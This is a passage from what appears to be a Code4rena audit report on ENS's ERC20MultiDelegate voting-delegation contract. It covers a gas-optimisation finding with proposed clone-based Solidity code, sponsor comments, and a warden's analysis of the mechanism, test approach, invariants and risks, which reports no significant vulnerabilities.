     * @dev Executes the delegation transfer process for multiple source and target delegates.
     * @param sources The list of source delegates.
     * @param targets The list of target delegates.
     * @param amounts The list of amounts to deposit/withdraw.
     */
    function delegateMulti(uint256[] calldata sources, uint256[] calldata targets, uint256[] calldata amounts)
    external
    {
        _delegateMulti(sources, targets, amounts);
    }

    function _delegateMulti(uint256[] calldata sources, uint256[] calldata targets, uint256[] calldata amounts)
    internal
    {
        uint256 sourcesLength = sources.length;
        uint256 targetsLength = targets.length;
        uint256 amountsLength = amounts.length;

        require(
            sourcesLength > 0 || targetsLength > 0,
            "Delegate: You should provide at least one source or one target delegate"
        );

        require(
            Math.max(sourcesLength, targetsLength) == amountsLength,
            "Delegate: The number of amounts must be equal to the greater of the number of sources or targets"
        );

        // Iterate until all source and target delegates have been processed.
        for (uint256 transferIndex = 0; transferIndex < Math.max(sourcesLength, targetsLength); transferIndex++) {
            address source = transferIndex < sourcesLength ? address(uint160(sources[transferIndex])) : address(0);
            address target = transferIndex < targetsLength ? address(uint160(targets[transferIndex])) : address(0);
            uint256 amount = amounts[transferIndex];

            if (transferIndex < Math.min(sourcesLength, targetsLength)) {
                // Process the delegation transfer between the current source and target delegate pair.
                _processDelegation(source, target, amount);
            } else if (transferIndex < sourcesLength) {
                // Handle any remaining source amounts after the transfer process.
                _reimburse(source, amount);
            } else if (transferIndex < targetsLength) {
                // Handle any remaining target amounts after the transfer process.
                createProxyDelegatorAndTransfer(target, amount);
            }
        }

        if (sourcesLength > 0) {
            _burnBatch(msg.sender, sources, amounts[:sourcesLength]);
        }
        if (targetsLength > 0) {
            _mintBatch(msg.sender, targets, amounts[:targetsLength], "");
        }
    }

    /**
     * @dev Processes the delegation transfer between a source delegate and a target delegate.
     * @param source The source delegate from which tokens are being withdrawn.
     * @param target The target delegate to which tokens are being transferred.
     * @param amount The amount of tokens transferred between the source and target delegates.
     */
    function _processDelegation(address source, address target, uint256 amount) internal {
        uint256 balance = getBalanceForDelegate(source);

        assert(amount <= balance);

        deployProxyDelegatorIfNeeded(target);
        transferBetweenDelegators(source, target, amount);

        emit DelegationProcessed(source, target, amount);
    }

    /**
     * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.
     * @param source The source delegate from which tokens are being withdrawn.
     * @param amount The amount of tokens to be withdrawn from the source delegate.
     */
    function _reimburse(address source, uint256 amount) internal {
        // Transfer the remaining source amount or the full source amount
        // (if no remaining amount) to the delegator
        address proxyAddressFrom = retrieveProxyContractAddress(source);
        token.transferFrom(proxyAddressFrom, msg.sender, amount);
    }

    function setUri(string memory uri) external onlyOwner {
        _setURI(uri);
    }

    function createProxyDelegatorAndTransfer(address target, uint256 amount) internal {
        address proxyAddress = deployProxyDelegatorIfNeeded(target);
        token.transferFrom(msg.sender, proxyAddress, amount);
    }

    function transferBetweenDelegators(address from, address to, uint256 amount) internal {
        address proxyAddressFrom = retrieveProxyContractAddress(from);
        address proxyAddressTo = retrieveProxyContractAddress(to);
        token.transferFrom(proxyAddressFrom, proxyAddressTo, amount);
    }

    function deployProxyDelegatorIfNeeded(address delegate) internal returns (address) {
        address proxyAddress = retrieveProxyContractAddress(delegate);

        // check if the proxy contract has already been deployed
        uint256 bytecodeSize;
        assembly {
            bytecodeSize := extcodesize(proxyAddress)
        }

        // if the proxy contract has not been deployed, deploy it
        if (bytecodeSize == 0) {
            address userProxyDelegator = address(proxyDelegator).cloneDeterministic(bytes32(uint256(uint160(delegate)) << 96));
            ERC20ProxyDelegatorImplementation(userProxyDelegator).initialize(delegate);
            emit ProxyDeployed(delegate, proxyAddress);
        }
        return proxyAddress;
    }

    function getBalanceForDelegate(address delegate) internal view returns (uint256) {
        return ERC1155(this).balanceOf(msg.sender, uint256(uint160(delegate)));
    }

    function retrieveProxyContractAddress(address _delegate) private view returns (address) {
        return address(proxyDelegator).predictDeterministicAddress(bytes32(uint256(uint160(_delegate)) << 96));
    }
}
```

</details>

Test file comparing the gas savings can be found [here](https://gist.github.com/josipkoncurat/be5a290252911643cd9fc86665cfc15a).

In summary:

- `deployProxyDelegatorIfNeeded(...)` function:
  - Current implementation: `116_468` gas
  - Proposed implementation: `107_050` gas

- `retrieveProxyContractAddress(...)` function:
  - Current implementation: `5_510` gas
  - Proposed implementation: `1_475` gas

- To transfer voting shares to two new targets:
  - Current implementation: `434_865` gas
  - Proposed implementation: `426_582` gas

- To reimburse from two existing targets:
  - Current implementation: `150_506` gas
  - Proposed implementation: `138_346` gas

**[Arachnid (ENS) confirmed and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/409#issuecomment-1764202770):**
 > I want to flag this as particularly high quality, as the warden went out of their way to create and test alternate versions using the clone approach.

**[Arachnid (ENS) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/409#issuecomment-1764306628):**
 > This set me to looking at optimizations for the proxy, and this implementation is even lower gas than the submitter's:
> 
> ```
> contract ERC20ProxyDelegator {
>     constructor(ERC20Votes _token, address _delegate) payable {
>         _token.approve(msg.sender, type(uint256).max);
>         _token.delegate(_delegate);
>         assembly("memory-safe") {
>             mstore8(0, 0xff)
>             return(0, 1)
>         }
>     }
> }
> ```
> 
> Further optimisations by implementing the proxy in Yul would be possible, but time-consuming to implement.

***

# Audit Analysis

For this audit, 21 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-ens-findings/issues/492) by **polarzero** received the top score from the judge.

*The following wardens also submitted reports: [0xSmartContract](https://github.com/code-423n4/2023-10-ens-findings/issues/676), [d3e4](https://github.com/code-423n4/2023-10-ens-findings/issues/634), [rahul](https://github.com/code-423n4/2023-10-ens-findings/issues/596), [Sathish9098](https://github.com/code-423n4/2023-10-ens-findings/issues/535), [ihtishamsudo](https://github.com/code-423n4/2023-10-ens-findings/issues/534), [marchev](https://github.com/code-423n4/2023-10-ens-findings/issues/498), [MrPotatoMagic](https://github.com/code-423n4/2023-10-ens-findings/issues/447), [pfapostol](https://github.com/code-423n4/2023-10-ens-findings/issues/412), [radev\_sw](https://github.com/code-423n4/2023-10-ens-findings/issues/101), [ro1sharkm](https://github.com/code-423n4/2023-10-ens-findings/issues/678), [inzinko](https://github.com/code-423n4/2023-10-ens-findings/issues/546), [SBSecurity](https://github.com/code-423n4/2023-10-ens-findings/issues/479), [Bulletprime](https://github.com/code-423n4/2023-10-ens-findings/issues/461), [Limbooo](https://github.com/code-423n4/2023-10-ens-findings/issues/430), [J4X](https://github.com/code-423n4/2023-10-ens-findings/issues/417), [asui](https://github.com/code-423n4/2023-10-ens-findings/issues/414), [0xnev](https://github.com/code-423n4/2023-10-ens-findings/issues/339), [hyh](https://github.com/code-423n4/2023-10-ens-findings/issues/307), [ABA](https://github.com/code-423n4/2023-10-ens-findings/issues/158), and [0x3b](https://github.com/code-423n4/2023-10-ens-findings/issues/125).*

## 1. Overview

The system implements a mechanism to delegate voting power, through ERC20Votes compatible tokens, to multiple delegates. Specifically, the `ERC20MultiDelegate` contract allows for efficiently batching operations, regardless of their nature:

- *Delegating directly* from the user to a chosen delegate.
- Transferring a delegation *from one delegate to another*.
- *Revoking* a delegation and *withdrawing* the associated tokens.

The system uses the `ERC1155` standard to track the delegated amounts for each delegator, and proxy contracts to actually hold the delegated tokens.

This provides a secure way to hold these tokens, and allows for efficiently tracking the tokens delegated by individuals, in addition to the native `ERC20Votes` ability to track the voting power of each delegate. All this while ensuring a direct way for users to revoke any individual delegation, and withdraw the associated tokens, at any given moment.

Simplicity on the surface often stems from quality and efficiency beneath; such is the case with this system.

## 2. Audit approach

### 2.1 First overview

When I started the review, the first thing I did was to get a broader understanding of the system it is supposed to be part of, namely, the Ethereum Name Service. That’s why I started with a first look at the documentation, and mostly some back and forth with an AI, provided with the description of the audit, the code of the file in scope and some additional context. This gave me an abstract understanding of this specific system, how it could be used, as well as its benefits compared to existing similar structures. After a while, I was ready to go deeper into the code.

### 2.2 Environment

The first practical step was to convert the Hardhat tests into a Foundry environment. This would be a good starting point for the following parts, and eventually a good way to understand the system better. That’s when I truly grasped how “simple” it was: a single function that can be called by users, which will crawl through the provided arrays, each time performing one of three possible actions.

### 2.3 Testing

The tests already had 100% coverage, accounting for all the expected cases. My aim was to try to cover edge cases; flood it with large amounts of random arrays, in a progressively more accurate approach. The threat could come from both angles: meticulously crafted input data that would abuse the system, and unexpected or excessively large amounts of data that would break it.

It started with stateless fuzzing, throwing random data to the function. Then gradually less random as I would have it grab random credible inputs, and gradually more organized to perform one of three possible operations: delegate tokens from the user to a delegate, from a delegate to another, and withdraw them from a delegate. Which is the point where I switched to *stateful* fuzzing, and defined invariants.

### 2.4 Threats and Invariants

My primary concern in this system was that someone would be able to steal tokens from someone else - especially from a proxy contract, or end up with their funds stuck in a proxy.

A less concerning, but still significant issue, would be if someone were able to inflate votes without actually spending tokens, thus rendering the whole system obsolete.

The invariants mentioned in the details of the audit were the following:
- A. Tokens should only be transferred between approved delegators.
- B. The owner should only have the ability to change the URI for ERC1155 metadata.

I supplemented them with the following assumptions:
- C. The amounts of `ERC20` tokens delegated to an individual should always strictly equal the amount of `ERC1155` tokens owned for the ID corresponding to their address.
- D. The balance of a proxy contract should always strictly equal the votes of its associated delegate.
- E. A proxy contract should always contain as many tokens as the cumulative amount its delegate has been trusted with by multiple delegators.

The latter might seem a bit redundant, but it’s never too much.

### 2.5 Reports

The extensive testing and examination of the contract did not reveal - at least to me - any significant bug. Actually, any unexpected behavior at all. At some point, I felt I had exhausted a fair amount of options; I decided to focus on this write-up, and on reporting optimizations and informational “issues”.

## 3. Mechanism review

The `ERC20MultiDelegate` contract deploys/retrieves an individual `ERC20ProxyDelegator` proxy contract for each delegate, which hold the tokens they were delegated by various users.

The actual voting power/weight of each delegate is tracked with the `ERC20Votes` functionalities, saving a series of checkpoints to allow for retrieving their weight at the current time, as well as at a specific date. The amount of tokens distributed across delegates for a user is efficiently tracked by an `ERC1155` token, which associates each delegate’s address (as an ID) to the various balances of their delegators. These balances are “attached” to the amount of the actual token stored in the delegate’s proxy; not as it would *belong* to them, but as it is a unique contract *associated* to their address, providing a trust-minimized way to actually store the delegated tokens.

The only operating function accessible to the users is called `delegateMulti` and takes multiple parameters, to perform the various previously mentioned operations. The contract ensures that tokens are transferred correctly and that the `ERC1155` balances reflect these changes.

The following is a simplified call graph of the `ERC20MultiDelegate` contract, highlighting the different steps of the process, especially the three possible outcomes when calling `delegateMulti`. You can refer back to it throughout the analysis.

![Graph](https://user-images.githubusercontent.com/135237830/281191807-fa787fab-f50d-484d-9ec9-33454648f4c7.png)

The following is a list of key points related to this function, in the overall context of the contract, and should provide a better understanding of the possibilities. It is followed by a higher level example of interactions that can be expected, in an attempt to provide a comprehensive technical and conceptual perception of the system.

### 3.1 Key aspects

**3.1.1 `ERC20MultiDelegate` contract**
- A. The main function `delegateMulti` allows a user to specify source delegates (from whom tokens are withdrawn), target delegates (to whom tokens are given), and the amounts to be transferred.
- B. After making sure the highest number of sources or targets is equal to the number of amounts, it goes through each index, opening the following three possible outcomes:
  - The index includes both a source and a target.
    - Tokens are transferred from the source's proxy contract to the target's proxy contract.
  - The index includes only a target.
    - Tokens are transferred from the user (calling the function) to the unique proxy contract associated to the delegate’s address.
  - The index includes only a source.
    - Tokens are transferred from the proxy contract associated to the source, back to the user calling the function, thus canceling the delegation and withdrawing the tokens.
- C. Each of the above described outcomes will not allow any of such transfers if the caller is not the actual delegator to the sources passed to the function, or is passing an inflated amount.
- D. It won’t transfer either if the allowance for the token is insufficient; actually, it seems to revert if any of the intended transfers/delegations is inaccurate, abusive, or simply not possible.
- E. Each delegate address can be treated as a unique token ID due to the `ERC1155` implementation.
- F. Proxy contracts for delegates are created on demand. If a delegate doesn't have a proxy contract yet, one is deployed when required. This is done in the `deployProxyDelegatorIfNeeded` function.
- G. The address of a proxy contract for a specific delegate is deterministically computed using the `retrieveProxyContractAddress` function. This ensures that for a given delegate, the proxy contract's address will always be the same.

**3.1.2 `ERC20ProxyDelegator` contract**
- A. Every time this contract is deployed, it approves the `ERC20MultiDelegate` contract to spend all of its ERC20 tokens, so it can transfer them on its behalf.
- B. Immediately after the approval, the proxy contract delegates its votes to a specified delegate; more precisely, the one whose address was used to compute its own. This means the voting power of the tokens held by the proxy will be assigned to the delegate.

**3.1.3 Tracking the amount of `ERC1155`**

- A. Since the ERC1155 contract can manage multiple tokens, each representing a delegate, the balance of a specific delegate/token for an account can be checked using the `balanceOf` function.
- B. In the context of this system, this `balanceOf` function will return the exact same amount as `ERC20` tokens delegated by this account to this specific delegate (ID).
- C. This is due to the fact that when delegating tokens, the `ERC1155` balances are updated accordingly, making it a record of how much `ERC20` tokens an account has delegated to each delegate.

### 3.2 Step-by-step interactions

**3.2.1 Setting up**
- A. Alice has a certain amount of `ERC20` tokens in their wallet (inheriting from `ERC20Votes`).
- B. They identify multiple proposals or candidates they wish to support in the upcoming ENS governance vote. They decide they want to delegate their tokens among them.

**3.2.2 Initial delegation**
- A. Alice decides to delegate their tokens among three delegates: Bob, Charlie, and Dave.
- B. They want to split their tokens equally among them.
- C. Alice calls the `delegateMulti` function, providing three target addresses.
  - `Bob`, `Charlie`, `Dave` - and the amount for each.
  - Internally, the contract:
    - Checks if proxy contracts already exist for `Bob`, `Charlie`, and `Dave`.
    - Deploys proxy contracts for any delegate that doesn't have one.
    - Transfers Alice's tokens to these proxy contracts and updates their `ERC1155` balance for each, by minting the appropriate amount of tokens.
    - The proxy contracts then delegate the votes to `Bob`, `Charlie`, and `Dave` respectively.

**3.2.3 Changing delegation**
- A. After some time, Alice decides they want to change the delegation. They want to remove the delegation from Dave and split their share between Bob and Charlie.
- B. Alice calls the `delegateMulti` function again. This time, they provide `Dave`'s address as a `source` (indicating they're withdrawing from them) and `Bob` and `Charlie` addresses as `targets`.
  - Internally, the contract:
    - Withdraws the tokens from Dave's proxy contract.
    - Splits and redistributes these tokens to Bob's and Charlie’s proxy contracts.
    - Updates Alice's `ERC1155` balances for all of them, by burning/minting the associated tokens in batches.
    - The proxies then adjust the delegation accordingly.

**3.2.4 Reclaiming tokens**

- A. At some point, Alice decides they want to reclaim some of their tokens from Bob and Charlie.
- B. Alice calls the `delegateMulti` function, providing `Bob` and `Charlie`’s addresses as `sources` but doesn't provide any targets.
  - Internally, the contract:
    - Withdraws the tokens from the proxy contracts of both Bob and Charlie.
    - Transfers them directly to Alice’s wallet.
    - Burns all of Alice's ERC1155 tokens for the IDs corresponding to Bob and Charlie’s addresses.
    - The proxy then resets Alice's delegation for both delegates.

## 4. Architecture recommendations

 The following architectural recommendations can be made.

### 4.1 Batch Processing & gas usage

The batch processing methods (`_burnBatch`, `_mintBatch`) should be monitored for gas consumption, especially when handling a large array of delegates. The same applies for deploying multiple proxy contracts, when dealing with a wide array of new delegates as targets.

This is especially relevant if an implementation intends to handle gas for users (i.e. meta transactions), which could easily be abused, even by accident.

### 4.2 User interface

This application requires a thoroughly designed interface. Otherwise, it would be too easy to mess up the array formatting, thereby performing unintended transactions.

While in most cases it would not constitute a significant risk, it *could* in some edge cases. For instance, in the event of a highly disputed vote, any widespread malfunction in the system could have drastic consequences.

## 5. Centralization risks

The only privilege of the owner is the ability to change the `ERC1155` metadata URI (`setUri`), which does not directly affect the core functionality of the `ERC20MultiDelegate` contract. Its operations, like delegation, proxy deployment, and transfers, would be left unaffected by any update of this URI.

The only issue would be an inconvenience for the users, due to the inaccessibility/tempering of information related to a delegate. Which definitely does not constitute a significant centralization risk.

## 6. Systemic risks

### 6.1 Malformed data

The main concern would be poor formatting of the input data for the delegation process, as described in `4.2`.

This would, due to the accurate definition in the contract, in any case, revert if the data is incorrect, or do some reversible non-significant damages. Meaning, delegating too much/too few tokens, withdrawing them by mistake or transferring them from/to an incorrect delegate; any of this, if easily accessible on a user-friendly interface, would be easily noticed and fixed without any significant threat.

### 6.2 Dependencies versions

There are questions concerning the outdated versions of contracts, used in the provided repository, and which versions will be used for deployment.

It is even more unclear whether the versions from the audit package or the latest ones will be utilized, as the contracts referenced in the ENS documentation are deployed using the most recent versions.

This is especially true for packages related to @ensdomains and @openzeppelin, given the huge gap between versions. See in `package.json`:

```json
"dependencies": {
    // 2 years old, latest is 0.0.22 as of 2023-10-11
    "@ensdomains/ens-contracts": "^0.0.7",
    // 2 years old, latest is 5.0.0 as of 2023-10-11
    "@openzeppelin/contracts": "^4.3.1",
    // ...
  },
```

Just a specific example, [the `PublicResolver` contract deployed in tests](https://github.com/code-423n4/2023-10-ens/blob/main/test/delegatemulti.js#L110) takes two parameters in the older version (the `ENS` and `INameWrapper` contract/interface), whereas the latest one takes four parameters (the same + addresses for a trusted ETH controller and a trusted reverse registrar).

In any case, the audit is intended to cover such cases, regardless if the version is 0.0.7 or above (as it is actually indicated). The point highlighted is the potential benefit of clearly defining the versions of dependencies intended for deployment, as late as possible, and the possibility of introducing new vulnerabilities in the case of an upgrade *after* the audit is completed.

## 7. Conclusion

During this audit, which was my first, I first felt a bit disappointed not finding medium/high issues. But, it's actually a testament to the developer's expertise.

Systems implementing new approaches, to address a missing or unusual solution, often thrive when simplified strategically. This specific code might appear complex at first glance, however, it's actually rather straightforward, with clever layout beneath the surface.

Depending on the final results, this audit will provide a good reflection of my current skills. Regardless of financial outcomes, I really enjoyed the process; it was great auditing a system I'm truly interested in, while improving my testing skills, with in-depth analysis and formal verification methods.

Looking forward, I’m eager to dive into more implementations from the ENS team and help with the review and security assessment.

### Time spent

40 hours

**[Arachnid (ENS) acknowledged](https://github.com/code-423n4/2023-10-ens-findings/issues/492#issuecomment-1764152751)**

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
